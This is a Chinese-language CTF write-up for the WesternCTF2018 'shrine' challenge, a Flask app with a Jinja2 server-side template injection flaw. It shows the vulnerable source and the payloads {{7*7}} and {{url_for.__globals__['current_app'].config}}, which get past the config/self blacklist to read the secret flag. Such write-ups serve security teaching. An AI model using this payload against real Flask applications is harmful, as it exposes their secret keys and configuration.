## [WesternCTF2018]shrine

 1 import flask 

2 import os 

3  

4 app = flask.Flask(__name__) 

5  

6 app.config['FLAG'] = os.environ.pop('FLAG')//注册了一个名为FLAG的config，这里基本可以确定是flag。 

7  

8  

9 @app.route('/') 10 def index(): 

11     return open(__file__).read() 

12  

13  

14 @app.route('/shrine/<path:shrine>')//这里设置了shrine路由，这里可能会实现ssti 

15 def shrine(shrine): 

16  

17     def safe_jinja(s)://jinja模板 

18         s = s.replace('(', '').replace(')', '') 

19         blacklist = ['config', 'self']//设置黑名单 

20         return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s//把黑名单的东西遍历并设为空 

21  

22     return flask.render_template_string(safe_jinja(shrine))//进行模块渲染 23  

24 

 25 if __name__ == '__main__': 26     app.run(debug=True)

有jinja模板，render渲染，可以试试ssti，在/shrine后面加上{{7*7}}

发现有49，有ssti漏洞

通过代码，我们可以想到是访问shrine路径，在shrine下利用用ssti漏洞，测试一下吧 shrine/{{7*7}} 

用{{config}}查看配置文件，发现没有东西，被黑名单过滤了，{{self.**dict**}}也可以，但是被过滤了。但是在python里，有许多内置函数，其中有一个 url_for ，其作用是给指定的函数构造 URL。配合**globals()**，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果

 shrine/{{url_for.__globals__}}

![img](https://img2020.cnblogs.com/blog/2154558/202103/2154558-20210330102302921-1656687710.png)

current_app': <Flask 'app'>这里的current就是指的当前的app，这样我们只需要能查看到这个的config不就可以看到flag了，那么构造payload

shrine/{{url_for.__globals__['current_app'].config}}

![img](https://img2020.cnblogs.com/blog/2154558/202103/2154558-20210330102531223-997983878.png)

找到flag

### 知识点：{{url_for.__globals__}}会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果

可以代替{{config}}

